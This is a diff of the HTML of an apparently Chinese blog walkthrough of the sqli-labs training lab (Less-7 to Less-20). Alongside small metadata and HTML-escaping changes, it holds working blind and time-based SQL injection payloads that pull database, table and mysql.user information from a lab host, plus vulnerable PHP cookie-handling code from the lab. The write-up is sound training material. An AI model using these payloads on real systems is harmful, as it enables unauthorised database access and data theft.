@@ -417,14 +417,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        13.3k
+                        14k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        61 分
+                        64 分
                     </div>
                     
                 
@@ -899,7 +899,7 @@ table th:first-of-type {
 <ol start="5">
 <li><strong>测试当前用户权限</strong></li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) and(select count(*) from mysql.user)&gt;0%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-7/?id=1')) and(select count(*) from mysql.user)>0%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ol start="6">
 <li><strong>在服务器端修改 mysql 配置文件（开启 mysql 数据导入导出功能）</strong></li>
 </ol>
@@ -1148,9 +1148,9 @@ secure_file_priv=''<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <ol start="2">
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))&gt;55%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))>55%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/Yei8ndPQJ39HzGB.png" alt="less8-5.png"></p>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))&gt;56%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))>56%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/ZRunGcPSwdhg5bT.png" alt="less8-6.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(length((select database())))=56%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/sePb4EIMOg19KW6.png" alt="less8-7.png"></p>
@@ -1160,9 +1160,9 @@ secure_file_priv=''<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <ul>
 <li>判断第一个字母</li>
 </ul>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))&gt;110%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))>110%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/KE7wlrNu1GSgVav.png" alt="less8-8.png"></p>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))&gt;115%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))>115%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/eFXs9IfU2nNCASH.png" alt="less8-9.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),1,1))=115%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/r8f1K9OlnySh3FC.png" alt="less8-10.png"></p>
@@ -1170,9 +1170,9 @@ secure_file_priv=''<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <ul>
 <li>判断第二个字母</li>
 </ul>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))&gt;100%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))>100%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/DzgLq2x9WAtwKF7.png" alt="less8-11.png"></p>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))&gt;101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))>101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/w2CADSa6zbhXlNG.png" alt="less8-12.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),2,1))=101%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/09/AMoWTIfOYiZkuJ9.png" alt="less8-13.png"></p>
@@ -1213,21 +1213,21 @@ secure_file_priv=''<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <ol start="2">
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))&gt;56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))>56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/5pRUJo36x1wNarc.png" alt="less9-2.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))=56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/FZIXTMNaoPAYJj6.png" alt="less9-3.png"></p>
 <ol start="3">
 <li><strong>判断数据库</strong></li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))>115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/3GwjcbBpYnvPZH5.png" alt="less9-4.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/eonK3brJVg4LaXY.png" alt="less9-5.png"></p>
 <ol start="4">
 <li><strong>判断表</strong></li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/8jGMV7ZxhvKIFpz.png" alt="less9-6.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/16/9tTmR73w46gBbe2.png" alt="less9-7.png"></p>
@@ -1248,21 +1248,21 @@ secure_file_priv=''<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <ol>
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))&gt;56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))>56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/20/yPOJlxQK7fB69u4.png" alt="less10-1.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))=56, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/20/Vfd7gaj4nK8CFsN.png" alt="less10-2.png"></p>
 <ol start="2">
 <li><strong>判断数据库</strong></li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))>115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/20/xuRBE6a1CdqSYT7.png" alt="less10-3.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/20/WFPj8zL3QYrURAJ.png" alt="less10-4.png"></p>
 <ol start="3">
 <li><strong>判断表</strong></li>
 </ol>
-<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/20/ycveLYBhmkOlMVR.png" alt="less10-5.png"></p>
 <pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/20/ZELaSOh3lvyU9zu.png" alt="less10-6.png"></p>
@@ -1541,10 +1541,10 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <h3 id="注入步骤-5"><a href="#注入步骤-5" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">&gt;</span>55<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">></span>55<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/O5cKM2WgI8pJZXj.png" alt="less15-1.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">&gt;</span>56<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">></span>56<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/d8LJQGYpgvuMVRn.png" alt="less15-2.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>56<span class="token comment" spellcheck="true">#</span>
@@ -1556,10 +1556,10 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <ul>
 <li>第一个字母</li>
 </ul>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>110<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>110<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/FSUwuC9bl7tJf2L.png" alt="less15-4.png"></p>
-<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115<span class="token comment" spellcheck="true">#</span>
+<pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>115<span class="token comment" spellcheck="true">#</span>
 password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/03/qM48LYVXJtDIvok.png" alt="less15-5.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115<span class="token comment" spellcheck="true">#</span>
@@ -1591,21 +1591,21 @@ password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <ol>
 <li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">></span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/QMI51DvbLS8CFjO.png" alt="less16-1.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">=</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/2hpJgend5mwB8Hq.png" alt="less16-2.png"></p>
 <ol start="2">
 <li><strong>判断数据库</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/MtFigc9dbUP54wR.png" alt="less16-3.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/aHYBrE32bzwpNlF.png" alt="less16-4.png"></p>
 <ol start="3">
 <li><strong>判断表</strong></li>
 </ol>
-<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">></span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/sHFIJxU3ldpgwyn.png" alt="less16-5.png"></p>
 <pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/04/mQULM4ZgyEfPaYT.png" alt="less16-6.png"></p>
@@ -1841,19 +1841,19 @@ echo 'Your Referer is: ' .$uagent;<span aria-hidden="true" class="line-numbers-r
                 <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span>
                                 <span class="token punctuation">{</span>
-                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>
                                 <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$cookee</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                 <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                 <span class="token keyword">echo</span> <span class="token string">"I LOVE YOU COOKIES"</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;"</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size = 3 &gt;'</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size = 3 >'</span><span class="token punctuation">;</span>
                                 <span class="token comment" spellcheck="true">//echo 'Your Cookie is: ' .$cookee;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;"</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                                 <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;&lt;br&gt;"</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/flag.jpg" /&gt;'</span><span class="token punctuation">;</span>
-                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>"</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/flag.jpg" />'</span><span class="token punctuation">;</span>
+                                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
                                 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ol start="3">
 <li><strong>若 cookie 存在，又分两种情况， 第一种情况，你登陆过，cookie 还有效，你没按删除 cookie 的按钮，那么他就输出各种信息，包括删除 cookie 的按钮</strong></li>
@@ -1864,23 +1864,23 @@ echo 'Your Referer is: ' .$uagent;<span aria-hidden="true" class="line-numbers-r
                         <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                         <span class="token variable">$format</span> <span class="token operator">=</span> <span class="token string">'D d M Y - H:i:s'</span><span class="token punctuation">;</span>
                         <span class="token variable">$timestamp</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">"&lt;center&gt;"</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/Less-20.jpg" /&gt;'</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;br&gt;&lt;font color= "red" font size="4"&gt;'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">"&lt;center>"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;br>&lt;br>&lt;br>'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/Less-20.jpg" />'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>&lt;b>"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;br>&lt;font color= "red" font size="4">'</span><span class="token punctuation">;</span>
                         <span class="token keyword">echo</span> <span class="token string">"YOUR USER AGENT IS : "</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;&lt;br&gt;"</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "cyan" font size="4"&gt;'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>&lt;br>"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "cyan" font size="4">'</span><span class="token punctuation">;</span>
                         <span class="token keyword">echo</span> <span class="token string">"YOUR IP ADDRESS IS : "</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;&lt;br&gt;"</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 4 &gt;'</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;"</span><span class="token punctuation">;</span>
-                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "orange" font size = 5 &gt;'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>&lt;br>"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 4 >'</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br>"</span><span class="token punctuation">;</span>
+                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "orange" font size = 5 >'</span><span class="token punctuation">;</span>
                         <span class="token keyword">echo</span> <span class="token string">"YOUR COOKIE : uname = $cookee and expires: "</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token variable">$format</span><span class="token punctuation">,</span> <span class="token variable">$timestamp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 
-                        <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;&lt;/font&gt;"</span><span class="token punctuation">;</span>
